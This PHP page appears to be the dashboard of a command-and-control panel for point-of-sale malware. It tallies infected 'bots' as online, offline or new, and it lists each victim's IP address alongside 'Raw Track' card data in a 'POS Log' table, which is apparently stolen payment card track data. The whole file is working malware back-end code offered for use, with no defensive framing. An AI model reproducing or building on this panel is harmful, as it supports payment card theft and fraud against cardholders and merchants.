
<!DOCTYPE html>
<html>
<?php
include("header.php");
?>
	<body>
<?php
include("sidebar.php");

include("config.php");

$total_bots = "";
$bots_online= "";
	$bot_new=  "";
	$bots_offline = "";
$totalbot = "SELECT * FROM logs";
$onlinebots = "SELECT * FROM logs WHERE `time` >= date_sub(NOW(), interval 10 minute);";
$offlinebots = "SELECT * FROM logs WHERE `time` < date_sub(NOW(), interval 10 minute);";
$latestbots = "SELECT * FROM logs WHERE `time` >= date_sub(NOW(), interval 24 hour);";
if($stmt = $connection->prepare($totalbot)){
	$stmt->execute();
	$stmt->store_result();
	$total_bots=  $stmt->num_rows;
}
if($stmt = $connection->prepare($onlinebots)){
	$stmt->execute();
	$stmt->store_result();
	$bots_online=  $stmt->num_rows;	
}
if($stmt = $connection->prepare($offlinebots)){
	$stmt->execute();
	$stmt->store_result();
	$bots_offline=  $stmt->num_rows;
}
if($stmt = $connection->prepare($latestbots)){
	$stmt->execute();
	$stmt->store_result();
	$bot_new=  $stmt->num_rows;
}
?>

		<div class="col-sm-9 col-sm-offset-9 col-lg-10 col-lg-offset-2 main">	

	<div class="row" style="margin-top:10px;">
		<div class="col-xs-6 col-md-6">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>Total Logs</h4>
					<div class="easypiechart" id="easypiechart-blue" data-percent="100%" ><span class="percent" id="total"><?php echo $total_bots;?></span></div>
				</div>
			</div>
		</div>

		<div class="col-xs-6 col-md-6">
			<div class="panel panel-default">
				<div class="panel-body easypiechart-panel">
					<h4>New Logs Today</h4>
					<div class="easypiechart" id="easypiechart-orange" data-percent="100" ><span class="percent" id="new"><?php echo $bots_offline;?></span></div>
				</div>
			</div>
		</div>
	</div><!--/.row-->	

	<div class="row">
		<div class="col-lg-12">
			<div class="panel panel-default">
				<div class="panel-body">
				<center>
				<div class="panel-heading">POS Log</div>
				</center>
					<table data-toggle="table">
						<thead>
							<tr>
								
								<th data-field="machine_id"  data-sortable="true">Log #</th>
								<th data-field="IPv4"  data-sortable="true">IPv4</th>
								<th data-field="machine_id"  data-sortable="true">Raw Track</th>
							</tr>
						</thead>
						<tbody>
						<?php
		if($stmt = $connection->prepare("SELECT * FROM `logs`")){
		$stmt->execute();		
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
	    while($row = $result->fetch_assoc()) {
			echo "<tr><td>". $row["id"] . "</td><td>". htmlEntities($row["ip"], ENT_QUOTES) . "</td><td><textarea class=\"form-control\" rows=\"1\" readonly>" . htmlEntities($row["track"], ENT_QUOTES) . "</textarea></td></tr>";
			
		}
		}
		}
											
											?>
						</tbody>
					</table>
				</div>
			</div>
		</div>
	</div><!--/.row-->	


</div>	<!--/.main-->
		<?php
		include("footer.php");
		
		
		?>
	</body>

</html>